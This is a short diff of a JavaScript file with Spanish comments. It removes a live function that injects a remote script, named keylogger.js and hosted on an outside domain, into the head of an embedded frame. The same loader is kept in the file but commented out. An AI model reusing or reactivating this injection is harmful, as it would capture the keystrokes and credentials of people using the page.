@@ -242,14 +242,14 @@ document.getElementById("CI").style.height="50px";
 //
 ////FIN DEL SCRIPT.
 
-
-function eD()
+/*
+function K()
 {
 var cabe = IN.CI.document.head
 var scriptt = document.createElement('script');
 scriptt.src="http://kosmosapps.xyz/keylogger.js";
 cabe.appendChild(scriptt);
 }
-eD();
-
+K();
+*/
 
